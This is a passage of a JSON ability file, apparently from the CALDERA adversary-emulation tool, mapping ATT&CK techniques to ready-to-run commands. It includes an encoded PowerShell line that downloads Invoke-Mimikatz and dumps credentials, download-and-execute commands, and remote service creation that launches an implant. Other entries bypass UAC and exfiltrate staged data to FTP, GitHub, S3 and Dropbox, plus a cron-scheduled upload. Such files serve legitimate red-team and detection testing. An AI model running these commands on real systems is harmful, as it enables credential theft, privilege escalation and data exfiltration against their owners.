                    "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"
                }
            }
        },
        "id__dependence__fact": [
            "ccdb8caf-c69e-424b-b930-551969450c57",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "ccdb8caf-c69e-424b-b930-551969450c57"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__bfff9006-d1fb-46ce-b173-92cb04e9a031": {
        "description": "Download",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"
                }
            }
        },
        "id__dependence__fact": [
            "bfff9006-d1fb-46ce-b173-92cb04e9a031",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__134b49a3-3f93-41bd-85f4-563eadbb6055": {
        "description": "Kill all PowerShell processes",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "pwsh": {
                    "command": "Get-Process -Name \"powershell\" | Stop-Process\n"
                }
            }
        },
        "id__dependence__fact": [
            "134b49a3-3f93-41bd-85f4-563eadbb6055",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "134b49a3-3f93-41bd-85f4-563eadbb6055"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__315cedf1-4a3a-4015-b63f-149d64bacbbc": {
        "description": "Emulate administrator tasks on a system in a separate process",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n",
                    "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n",
                    "payloads": [
                        "Emulate-Administrator-Tasks.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "315cedf1-4a3a-4015-b63f-149d64bacbbc",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc"
    },
    "T1569.002__execution__System Services: Service Execution__95727b87-175c-4a69-8c7a-a5d82746a753": {
        "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1569.002",
            "name": "System Services: Service Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "timeout": 300,
                    "cleanup": "sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI \"Imagename eq s4ndc4t.exe\"\n",
                    "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n"
                }
            }
        },
        "id__dependence__fact": [
            "95727b87-175c-4a69-8c7a-a5d82746a753",
            "remote.host.fqdn",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__3796a00b-b11d-4731-b4ca-275a07d83299": {
        "description": "Run an application as a different user",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"
                }
            }
        },
        "id__dependence__fact": [
            "3796a00b-b11d-4731-b4ca-275a07d83299",
            "host.user.name",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3796a00b-b11d-4731-b4ca-275a07d83299"
    },
    "T1105__command-and-control__Ingress Tool Transfer__eb814e03-811a-467a-bc6d-dcd453750fa2": {
        "description": "Download and install PSTools by unzipping the file",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"
                }
            }
        },
        "id__dependence__fact": [
            "eb814e03-811a-467a-bc6d-dcd453750fa2",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "eb814e03-811a-467a-bc6d-dcd453750fa2"
    },
    "T1105__command-and-control__Ingress Tool Transfer__60f63260-39bb-4136-87a0-b6c2dca799fc": {
        "description": "Download, install and start new process under PowerShell Core 6",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;\n",
                    "cleanup": "rm PowerShellCore.msi;\n"
                }
            }
        },
        "id__dependence__fact": [
            "60f63260-39bb-4136-87a0-b6c2dca799fc",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc"
    },
    "T1548.002__privilege-escalation__Abuse Elevation Control Mechanism: Bypass User Access Control__b7344901-0b02-4ead-baf6-e3f629ed545f": {
        "description": "executes the slui exe file handler hijack",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "b7344901-0b02-4ead-baf6-e3f629ed545f",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "b7344901-0b02-4ead-baf6-e3f629ed545f"
    },
    "T1548.002__privilege-escalation__Abuse Elevation Control Mechanism: Bypass User Access Control__665432a4-42e7-4ee1-af19-a9a8c9455d0c": {
        "description": "Set a registry key to allow UAC bypass",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"
                }
            }
        },
        "id__dependence__fact": [
            "665432a4-42e7-4ee1-af19-a9a8c9455d0c",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c"
    },
    "T1548.002__privilege-escalation__Abuse Elevation Control Mechanism: Bypass User Access Control__e99cce5c-cb7e-4a6e-8a09-1609a221b90a": {
        "description": "UIPI bypass with uiAccess application",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a"
    },
    "T1548.002__privilege-escalation__Abuse Elevation Control Mechanism: Bypass User Access Control__95ad5d69-563e-477b-802b-4855bfb3be09": {
        "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd,psh": {
                    "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "95ad5d69-563e-477b-802b-4855bfb3be09",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09"
    },
    "T1548.002__privilege-escalation__Abuse Elevation Control Mechanism: Bypass User Access Control__e3db134c-4aed-4c5a-9607-c50183c9ef9e": {
        "description": "Bypass user account controls - medium",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n",
                    "payloads": [
                        "Bypass-UAC.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e"
    },
    "T1537__exfiltration__Transfer Data to Cloud Account__ba0deadb-97ac-4a4c-aa81-21912fc90980": {
        "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1537",
            "name": "Transfer Data to Cloud Account"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n"
                }
            }
        },
        "id__dependence__fact": [
            "ba0deadb-97ac-4a4c-aa81-21912fc90980",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "ba0deadb-97ac-4a4c-aa81-21912fc90980"
    },
    "T1048.003__exfiltration__Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__d754878c-17dd-46dc-891c-a993f8a10336": {
        "description": "This ability exfiltrates a compressed archive to an FTP server.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n"
                }
            }
        },
        "id__dependence__fact": [
            "d754878c-17dd-46dc-891c-a993f8a10336",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "d754878c-17dd-46dc-891c-a993f8a10336"
    },
    "T1567.001__exfiltration__Exfiltration to Code Repository__0582dc26-e0cf-4645-88cf-f37a02279976": {
        "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;\n"
                }
            }
        },
        "id__dependence__fact": [
            "0582dc26-e0cf-4645-88cf-f37a02279976",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "0582dc26-e0cf-4645-88cf-f37a02279976"
    },
    "T1560.001__exfiltration__Archive Collected Data: Archive via Utility__300157e5-f4ad-4569-b533-9d1fa0e74d74": {
        "description": "Compress a directory on the file system",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n",
                    "cleanup": "rm #{host.dir.staged}.tar.gz\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n",
                    "cleanup": "rm #{host.dir.staged}.zip\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "300157e5-f4ad-4569-b533-9d1fa0e74d74",
            "host.dir.staged",
            "host.dir.compress",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74"
    },
    "T1560.001__exfiltration__Archive Collected Data: Archive via Utility__2f90d4de-2612-4468-9251-b220e3727452": {
        "description": "This ability will compress a given git repository.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;\n",
                    "cleanup": "rm #{host.dir.git}.tar.gz;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;\n",
                    "cleanup": "Remove-Item -Path #{host.dir.git}.tar.gz;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "2f90d4de-2612-4468-9251-b220e3727452",
            "None",
            "host.dir.compress",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2f90d4de-2612-4468-9251-b220e3727452"
    },
    "T1567.001__exfiltration__Exfiltration to Code Repository__a201bec2-a193-4b58-bf0e-57fa621da474": {
        "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$LocalDirectory = \"#{host.dir.staged}\";\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n\n$Files = Get-ChildItem $LocalDirectory;\nforeach ($file in $Files){\n    $RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n    $uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n    $Body = @{\n        path = $file.Name;\n        branch = $GHBranch;\n        content = $Base64EncodedFileBytes;\n        encoding = 'base64';\n        message = \"Committed \" + $file.name + \" at: \" + (Get-Date);\n    } | ConvertTo-Json;\n    try {\n        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n    } catch {\n        if ($PSItem -notmatch \"but expected\") { $PSItem; }\n        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }\n    }\n};\n"
                }
            }
        },
        "id__dependence__fact": [
            "a201bec2-a193-4b58-bf0e-57fa621da474",
            "host.dir.staged",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "a201bec2-a193-4b58-bf0e-57fa621da474"
    },
    "T1567.002__exfiltration__Exfiltration to Cloud Storage__e7bf5dc7-62e4-48b2-acf8-abaf8734c19c": {
        "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.002",
            "name": "Exfiltration to Cloud Storage"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n",
                    "cleanup": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n",
                    "cleanup": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n"
                }
            }
        },
        "id__dependence__fact": [
            "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c"
    },
    "T1567.002__exfiltration__Exfiltration to Cloud Storage__3ce95a28-25fc-4a7e-a0cd-0fdb190e2081": {
        "description": "This will exfiltrate an archive to Dropbox.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.002",
            "name": "Exfiltration to Cloud Storage"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}\n"
                }
            }
        },
        "id__dependence__fact": [
            "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081"
    },
    "T1029__exfiltration__Scheduled Transfer__110cea7a-5b03-4443-92ee-7ccefaead451": {
        "description": "This ability exfiltrates the staged directory at a scheduled time.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1029",
            "name": "Scheduled Transfer"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;\n",
                    "cleanup": "rm /tmp/mycron;\ncrontab /tmp/origcron;\nrm /tmp/origcron;\n"
                }
            },
            "windows": {
                "psh": {
